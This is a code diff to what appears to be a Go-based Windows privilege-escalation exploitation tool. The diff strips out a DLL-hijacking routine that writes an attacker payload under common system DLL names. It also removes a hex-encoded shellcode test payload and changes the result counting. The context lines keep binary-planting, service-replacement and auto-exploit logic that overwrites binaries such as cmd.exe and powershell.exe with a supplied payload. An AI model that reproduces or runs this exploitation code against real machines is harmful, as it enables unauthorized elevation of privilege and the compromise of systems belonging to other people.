@@ -7,7 +7,6 @@ import (
 	"os"
 	"path/filepath"
 	"strings"
-	"strconv"
 )
 
 // ExploitResult represents the result of an exploitation attempt
@@ -37,34 +36,6 @@ type ExploitSession struct {
 }
 
 // Core exploitation functions
-
-// ExploitDllHijacking attempts to exploit DLL hijacking vectors
-func ExploitDllHijacking(vectors []EscalationVector, options ExploitOptions) []ExploitResult {
-	var results []ExploitResult
-	
-	for _, vector := range vectors {
-		if vector.Method != "DLL_HIJACK" {
-			continue
-		}
-		
-		result := ExploitResult{Vector: vector, Method: "DLL_HIJACK"}
-		
-		if options.TestMode {
-			result.Success = testDirectoryWritable(vector.Path)
-			result.Description = "Test mode"
-		} else {
-			success, err := executeDllHijacking(vector, options)
-			result.Success = success
-			if err != nil {
-				result.Error = err.Error()
-			}
-		}
-		
-		results = append(results, result)
-	}
-	
-	return results
-}
 
 // ExploitBinaryPlanting attempts to exploit binary planting vectors (PATH hijacking)
 func ExploitBinaryPlanting(vectors []EscalationVector, options ExploitOptions) []ExploitResult {
@@ -157,12 +128,10 @@ func ExploitVectors(vectors []EscalationVector, options ExploitOptions) *Exploit
 	session := &ExploitSession{Options: options, Results: []ExploitResult{}}
 	
 	// Group vectors by method
-	var dllVectors, binaryVectors, serviceVectors, taskVectors []EscalationVector
+	var binaryVectors, serviceVectors, taskVectors []EscalationVector
 	
 	for _, vector := range vectors {
 		switch vector.Method {
-		case "DLL_HIJACK":
-			dllVectors = append(dllVectors, vector)
 		case "BINARY_PLANT":
 			binaryVectors = append(binaryVectors, vector)
 		case "SERVICE_REPLACE":
@@ -173,11 +142,6 @@ func ExploitVectors(vectors []EscalationVector, options ExploitOptions) *Exploit
 	}
 	
 	// Execute exploitation by method type
-	if len(dllVectors) > 0 {
-		results := ExploitDllHijacking(dllVectors, options)
-		session.Results = append(session.Results, results...)
-	}
-	
 	if len(binaryVectors) > 0 {
 		results := ExploitBinaryPlanting(binaryVectors, options)
 		session.Results = append(session.Results, results...)
@@ -196,15 +160,18 @@ func ExploitVectors(vectors []EscalationVector, options ExploitOptions) *Exploit
 	// Calculate statistics
 	for _, result := range session.Results {
 		if options.TestMode {
+			session.Tested++
 			if result.Success {
-				session.Tested++
+				session.Success++
 			} else {
 				session.Failed++
 			}
-		} else if result.Success {
-			session.Success++
 		} else {
-			session.Failed++
+			if result.Success {
+				session.Success++
+			} else {
+				session.Failed++
+			}
 		}
 	}
 	
@@ -218,7 +185,7 @@ func AutoExploit(escMap *PrivEscMap, payload []byte, testMode bool) *ExploitSess
 	
 	// Add CRITICAL vectors first
 	for _, vectorGroup := range [][]EscalationVector{
-		escMap.DllHijacking, escMap.BinaryPlanting, escMap.ServiceReplace,
+		escMap.BinaryPlanting, escMap.ServiceReplace,
 		escMap.UnquotedPaths, escMap.TaskScheduler,
 	} {
 		for _, vector := range vectorGroup {
@@ -230,7 +197,7 @@ func AutoExploit(escMap *PrivEscMap, payload []byte, testMode bool) *ExploitSess
 	
 	// Add HIGH severity vectors
 	for _, vectorGroup := range [][]EscalationVector{
-		escMap.DllHijacking, escMap.BinaryPlanting, escMap.ServiceReplace,
+		escMap.BinaryPlanting, escMap.ServiceReplace,
 		escMap.UnquotedPaths, escMap.TaskScheduler,
 	} {
 		for _, vector := range vectorGroup {
@@ -250,31 +217,6 @@ func AutoExploit(escMap *PrivEscMap, payload []byte, testMode bool) *ExploitSess
 }
 
 // Implementation functions
-
-func executeDllHijacking(vector EscalationVector, options ExploitOptions) (bool, error) {
-	commonDlls := []string{"version.dll", "winmm.dll", "uxtheme.dll", "dwmapi.dll", "dbghelp.dll"}
-	
-	var targetDll string
-	if options.PayloadFilename != "" && strings.HasSuffix(options.PayloadFilename, ".dll") {
-		targetDll = options.PayloadFilename
-	} else {
-		targetDll = commonDlls[0]
-	}
-	
-	targetPath := filepath.Join(vector.Path, targetDll)
-	
-	if _, err := os.Stat(targetPath); err == nil && options.CreateBackup {
-		if err := copyFile(targetPath, targetPath+".backup"); err != nil {
-			return false, fmt.Errorf("failed to create backup: %v", err)
-		}
-	}
-	
-	if err := os.WriteFile(targetPath, options.Payload, 0755); err != nil {
-		return false, fmt.Errorf("failed to write DLL: %v", err)
-	}
-	
-	return true, nil
-}
 
 func executeBinaryPlanting(vector EscalationVector, options ExploitOptions) (bool, error) {
 	commonBinaries := []string{"cmd.exe", "powershell.exe", "notepad.exe", "calc.exe", "ping.exe"}
@@ -374,7 +316,7 @@ func GetExploitableVectors(escMap *PrivEscMap) []EscalationVector {
 	var exploitable []EscalationVector
 	
 	for _, vectorGroup := range [][]EscalationVector{
-		escMap.DllHijacking, escMap.BinaryPlanting, escMap.ServiceReplace,
+		escMap.BinaryPlanting, escMap.ServiceReplace,
 		escMap.RegistryPersist, escMap.UnquotedPaths, escMap.TaskScheduler,
 	} {
 		for _, vector := range vectorGroup {
@@ -385,16 +327,4 @@ func GetExploitableVectors(escMap *PrivEscMap) []EscalationVector {
 	}
 	
 	return exploitable
-}
-
-// GenerateTestPayload creates a simple test payload
-func GenerateTestPayload() []byte {
-	hexString := "505152535657556A605A6863616C6354594883EC2865488B32488B7618488B761048AD488B30488B7E3003573C8B5C17288B741F204801FE8B541F240FB72C178D5202AD813C0757696E4575EF8B741F1C4801FE8B34AE4801F799FFD74883C4305D5F5E5B5A5958C3"
-	
-	bytes := make([]byte, len(hexString)/2)
-	for i := 0; i < len(hexString); i += 2 {
-		b, _ := strconv.ParseUint(hexString[i:i+2], 16, 8)
-		bytes[i/2] = byte(b)
-	}
-	return bytes
 }
